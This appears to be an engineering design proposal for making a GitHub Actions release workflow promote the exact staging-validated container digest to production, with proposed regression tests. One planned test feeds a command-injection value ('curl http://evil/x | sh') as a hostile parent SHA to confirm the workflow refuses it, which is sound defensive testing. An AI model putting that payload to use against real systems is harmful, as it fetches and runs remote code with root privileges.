# Closing the D6/SC3 release-promotion gap

Status: proposal. Records the analysis behind **Plan change 5** in
`03 — Implementation Plan` (line 125), which deferred this deliberately. Nothing
here is implemented; this document states what to implement, what test proves it,
and which part of the proof needs the maintainer.

## The gap

**SC3** (`00-project-intent.md:47`) — "the artifact serving production is
byte-identical to the one validated in earlier environments". **D6**
(`01-logic-design.md:82`) — a release adds `vX.Y.Z` to the *existing* digest via a
manifest-level retag, because "a rebuild yields a different digest".

The build end honours this. `deploy.yml:212` promotes with
`docker buildx imagetools create --prefer-index=false`, and
`every_imagetools_retag_prefers_the_source_manifest`
(`xtask/tests/deploy_workflow_guards.rs:184-204`) pins the flag that keeps the
promoted v-tag on the source digest.

The release end does not. The chain:

1. `deploy.yml:55` derives `SHA_TAG` from `$COMMIT_SHA` (`github.sha`)
   **unconditionally**, on both the release and the dispatch path.
2. Under `release: published` (`deploy.yml:13-14`), `github.sha` is the commit the
   release tag points at — the squash commit of the release PR
   (`docs/aws-deployment-plan.md:173-178`).
3. Nothing has ever built that commit. `release.yml:3-5` triggers only on
   `push: branches: [main]` and its single job runs release-please
   (`release.yml:35-37`), which cuts the tag; it builds no image. `deploy.yml`
   has no `push` trigger (`deploy.yml:3-14`).
4. So the `exists` probe (`deploy.yml:111-139`) reports `found=false`, the
   refuse-to-rebuild guard is scoped away from the release path
   (`deploy.yml:160-163`), and `Build and push (native arm64)`
   (`deploy.yml:174-180`) **builds a fresh digest** which `deploy.yml:212` then
   retags as `vX.Y.Z`.

`deploy.yml:151-158` states this in the workflow itself.

**Consequence — the gate cannot see it.** `tests/deployment-verify.sh:229-236`
asserts the `v0.1.1` digest also carries some `*sha-*` tag. It does: the tag the
release's own build just pushed. The assertion passes against a rebuilt image and
proves nothing about byte-identity, which the script itself records at lines
221-228. Scenario `prod-deploys-on-release-cut`
(`tests/features/verified-rollout.feature:9-13`) therefore reads green while its
second Then — "the v0.1.1 tag and the commit tag naming one and the same image
digest" — is false in the sense D6 means it.

**Two runbook claims are already written as if the fix existed.**
`docs/aws-deployment-plan.md:180` says `Build and push` is "**skipped** (the
canary's `sha-` tag is already in the registry)" — false today, `github.sha` is the
release commit, not the canary. Line 160 says the staging dispatch "leaves staging
on the digest prod will promote" — false, because step 2 adds the canary commit
*after* that dispatch. The design always meant promotion; the workflow never
implemented it.

## Options

The correct promotion target is **the digest built for the last commit on main
before the release commit** — the commit whose tree the release packages, and the
only commit in the release's ancestry that a dispatch has ever built.

| | Guarantees byte-identity? | Breaks / costs | First run, no prior state |
|---|---|---|---|
| **(a) Promote the release commit's first parent** — resolve `parents[0]` of `github.sha`, use its `sha-` tag as the promotion source | **Yes**, for the *built* half: prod runs exactly the digest built for the parent, or the run fails closed. Not by itself the *validated-in-staging* half | Breaks the prod dispatch at a release tag unless paired with a tag alias — see below. One `gh api` call and a 40-hex validation in `meta` | Fails closed if the parent was never dispatched. Requires reordering the M4 runbook so the staging dispatch runs *at* the canary commit |
| **(b) Promote the digest staging currently runs** | Only against a live reading. No registry pointer exists — a dispatch deploys `:sha-<12>` (`deploy.yml:81`), there is no moving `staging` tag | Needs SSM/deploy-role rights in the `build` job, which deliberately holds only the ECR push role (`deploy.yml:103-106`, and see `deploy.yml:92-94`). Races a concurrent staging deploy | Staging may be running nothing, or something newer than the release's content — it would promote that |
| **(c) Record the validated digest at cut time** (asset, body, or tag) | Yes, and it is the only option that literally encodes "validated" | The honest version records *after* the 101 verify passes, and that step lives in the `deploy` job, which has no ECR push rights (`deploy.yml:233-236`). A new artifact to write, read, and keep honest | No record exists for the first release; every consumer needs a "no record yet" branch |
| **(d) `push` trigger on main** | **No.** It guarantees an image *exists* for the release commit, freshly built from a different commit than staging validated | An arm64 build + ECR push on every main commit, against `RelayShared`'s lifecycle budget (Plan change 5(a)) | Works immediately — and immediately ships the wrong thing |

## Recommendation

Take **(a)**, plus a tag alias, plus the free half of **(c)**.

(a) is the only option that names a digest already in the registry by a rule the
workflow can evaluate with no new state: the release's parent is a fact of the git
graph. (b) resolves a *live* reading rather than the release's content — it would
happily promote a staging deploy made after the release PR opened, and it needs the
deploy role in the build job. (d) closes nothing: it converts "prod runs a
never-validated freshly-built image" into "prod runs a never-validated
previously-built image", and pays a build per main commit for the privilege. (c) in
its full form is right but needs ECR push rights in the `deploy` job and a
first-release special case — while GitHub *already stores* what it proposes to
store, which is the version to take.

**The three edits:**

1. **`meta`, release branch (`deploy.yml:57-78`).** After the existing tag guard,
   resolve the parent and derive `SHA_TAG` from it:
   `gh api repos/$GITHUB_REPOSITORY/commits/$COMMIT_SHA --jq .parents[0].sha`.
   Resolve from `$COMMIT_SHA`, not `$RELEASE_TAG` — under `release: published`
   `github.sha` is the tagged commit and is 40-hex by construction, so nothing
   externally influenced is interpolated into the API path. Validate the result
   `^[0-9a-f]{40}$` before emitting: it reaches the SSM `commands` string as root
   via `needs.build.outputs.image` (`deploy.yml:99`, `243`, `248`). Needs
   `GH_TOKEN` and, for the deployment check below, `deployments: read` on this job.
   It must still hold no `id-token` (`deploy.yml:16-17`).

2. **Refuse-to-rebuild guard (`deploy.yml:159-163`).** Delete the
   `github.event_name == 'workflow_dispatch' &&` clause. The condition becomes
   `needs.meta.outputs.environment == 'prod' && steps.exists.outputs.found == 'false'`,
   which covers the prod dispatch *and* the release path, since a release always
   resolves prod (`deploy.yml:77`). Without this, a release whose parent has no
   image builds from the *release* commit's checkout and pushes it under the
   *parent's* `sha-` tag — a mislabelled image, worse than today.

3. **Alias the release commit onto the promoted digest (`deploy.yml:212`).**
   `imagetools create` takes repeated `--tag`, so add
   `--tag <registry>/<repo>:sha-<release-commit12>` alongside the v-tag. `meta`
   emits only `sha_tag` (now the parent's) and `deploy_tag`, so the retag step
   computes this alias inline from `github.sha` in the `build` job — one `env:`
   entry, no third `meta` output. This is
   load-bearing, not tidiness: a prod dispatch resolves `deploy_tag = SHA_TAG`
   (`deploy.yml:79-82`), so `gh workflow run deploy.yml -f environment=prod --ref
   v0.1.0` (M4 step 4, `docs/aws-deployment-plan.md:188-195`) looks for
   `sha-<v0.1.0-release-commit12>`. Today that exists only because the release
   built it. Remove the build without the alias and rollback — and recovery from a
   failed release deploy — hits the guard from edit 2 and cannot proceed without
   un-publishing and re-publishing the release. The alias keeps every existing
   dispatch path working, unchanged, on the promoted digest.

   Recovery when a release fails closed *before* the retag (the parent image is
   absent): dispatch staging at the parent commit, then `gh run rerun <id>`. A
   rerun replays the original release payload, so `github.sha` and the resolved
   parent are unchanged. Nobody should reach for un-publish/re-publish.

   The considered alternative, making the dispatch path tag-aware
   (`github.ref_type == 'tag'` → resolve the parent and promote the v-tag), is a
   larger change to `deploy_tag` semantics and leaves the runbook's `:v0.1.0`
   claim (line 195) still wrong for non-tag dispatches. The alias is one flag.

4. **The free half of (c).** Before promoting, require that the parent commit has a
   successful `staging` deployment:
   `gh api "/repos/$GITHUB_REPOSITORY/deployments?environment=staging&sha=$PARENT"`,
   then follow each result's `statuses_url` (the list endpoint carries no statuses)
   and require **any** `success` in the history — not the latest state. GitHub
   auto-marks a superseded deployment `inactive` once a newer one succeeds in the
   same environment, so a staging dispatch made after the canary would leave the
   parent's deployment `inactive` and a latest-state check would refuse a commit
   staging did validate. GitHub records a Deployment for every
   job carrying `environment:` (`deploy.yml:229-231`), so this reads state the
   platform already keeps — no new artifact, no new write path. This is the half
   that turns "was built" into SC3's "validated in earlier environments". It is
   separable: ship edits 1-3 first if you want the smaller diff.

## The regression test

Home: `xtask/tests/deploy_workflow_guards.rs` — the established place for
deploy.yml config invariants, and its doctrine (lift the condition and *evaluate*
it; never grep for its text) is exactly what this needs. `xtask/Cargo.toml:12` has
`serde_json` only: hand-roll the `run:` block extraction (collect lines after
`run: |` while blank or indented past it, then dedent) rather than adding
`serde_yaml` for a test.

One shared `gh` stub — a script on a temp `PATH` that dispatches on an argv
substring (`commits/` vs `deployments`) — serves all of these.

**T1 `release_sha_tag_names_the_parent_commit_not_the_release_commit`.** Extract the
`- id: resolve` `run:` block, execute it under `bash` with `EVENT_NAME=release`,
`RELEASE_TAG=v0.1.1`, `COMMIT_SHA=<40-hex release sha>`, `GITHUB_OUTPUT=<tmp>`, and
the stub returning a distinct canary sha. Assert the file contains
`sha_tag=sha-<canary12>` and *not* `sha-<release12>`.
**RED today:** `deploy.yml:55` derives `SHA_TAG` from `$COMMIT_SHA` before the
branch, so it emits `sha-<release12>` and the stub is never consulted.

**T2 `release_parent_sha_that_is_not_40_hex_is_refused`.** Same harness; the stub
returns `dead; curl http://evil/x | sh`, and in a second case a value with a
trailing newline. Assert the script exits **nonzero** and writes no `sha_tag=` line.
This is the trust-boundary negative path the engineering rules require — the value
reaches an `AWS-RunShellScript` `commands` string as root.
**RED today:** the script exits 0 and emits `sha_tag=sha-<release12>`; there is no
refusal to observe.

**T3 `prod_promotion_refuses_to_build_on_the_release_path_too`.** Lift the `if:`
expression of the refuse-to-rebuild step and evaluate it under
`{github.event_name: release, needs.meta.outputs.environment: prod,
steps.exists.outputs.found: false}`; assert **true**. A GHA `if:` is not bash, so
either translate the conjunction to bash (`==` → `=`, each term wrapped in `[ ]`)
and reuse the existing `Command::new("bash")` idiom, or write a ~20-line
`&&`-conjunction evaluator over `<path> == '<literal>'` terms.
**RED today:** the condition carries `github.event_name == 'workflow_dispatch'`
(`deploy.yml:161`), false under a release, so the guard does not fire.

**T4 `harness_reads_the_dispatch_scoped_guard_as_not_firing`.** Mandatory teeth
check, mirroring `harness_detects_line_anchored_grep_as_broken`
(`deploy_workflow_guards.rs:110-125`). Feed the evaluator the literal historical
condition and assert it reads **false** under T3's context. Without it, an
evaluator that always returns true calls the fix present.

**T5 (only with edit 4) `release_refuses_a_parent_with_no_successful_staging_deployment`.**
Stub returns `[]` for the `deployments` path; assert nonzero exit.

**Gate tightening, not a regression test.** `tests/deployment-verify.sh:229-236`
should become a positive value assertion — expect
`sha-$(git rev-parse "$RELEASE_TAG^1" | cut -c1-12)` in the tag list, `^1`
explicitly, with a `BLOCKED:` message if the tag is not local (`git fetch --tags`).
Note the digest will carry *two* `sha-` tags after edit 3; the assertion names the
parent's, which is the one that means something. This cannot go red in CI — it
needs a registry — so it is a gate improvement, and T1-T4 are the regression test.

## Adversarial: what this still does not close

The recommendation closes the rebuild hole and the byte-identity hole completely:
after it, prod runs exactly the digest built for the release's parent commit or the
release fails closed. Three ways a non-identical or unvalidated image can still
reach prod:

- **A dev-only dispatch satisfies edit 2.** Any dispatch builds the `sha-` image, so
  edits 1-3 alone prove *built*, not *validated in staging*. Edit 4 is what closes
  this; without it the hole is narrower than today's but real.
- **The staging deployment record is forgeable.** Edit 4 trusts a GitHub-recorded
  fact that anyone with repo write can create — the same trust level as publishing
  a release, already accepted at `deploy.yml:58-62`. It is not a cryptographic
  attestation and should not be described as one.
- **A merge-commit release PR that is not the tip.** `parents[0]` is main's tip at
  merge time. If commits landed between the staging dispatch and the release merge,
  the parent is the newer one — unbuilt (fail closed, safe) or built by a dev
  dispatch (case 1). The runbook reorder below is what keeps this from being the
  normal case rather than the exception.

Unchanged pre-existing condition: ECR tags are `IMMUTABLE`
(`infra/lib/shared-stack.ts:34`), so re-running a release deploy already fails on
the retag. Edit 3 adds a second tag to that same create and does not change it.

## What needs a human

Provable in CI, with no AWS, by `cargo test -p xtask`: **T1, T2, T3, T4** — the
`sha_tag` derivation, the hostile-parent refusal, the guard's scope, and the
harness's teeth.

Needs the maintainer's account and a real release cut:

1. That ECR actually holds `sha-<parent12>` when the release fires.
2. That the retag lands `vX.Y.Z` and both `sha-` aliases on one digest.
3. That the prod dispatch rollback at `--ref v0.1.0` still resolves its image
   through the alias (M4 step 4).
4. That `gh api ... .parents[0].sha` returns the canary under the real
   `release: published` payload. The call's shape can be checked by hand against any
   merged PR; its behaviour under the event cannot.
5. **R1's `handshake-returns-101` reading**, which remains the one open residual.

**Runbook edits this requires** (`docs/aws-deployment-plan.md`): swap M4 steps 1 and
2 (lines 153-171) so the staging dispatch runs **after** the canary merge, at the
canary commit — otherwise the first release fails closed on a parent staging never
saw. Then line 160's "leaves staging on the digest prod will promote" and line 180's
"`Build and push` is **skipped**" become true statements instead of aspirational
ones, and line 195's account of the rollback dispatch should say it deploys the
`sha-` alias, not `:v0.1.0`.

Amending the ratified gate commands or the byte-frozen scenario text is out of scope
for this document: implementing it requires a numbered **Plan change** note in `03`
carrying the empirical justification, per the convention the four existing notes set.
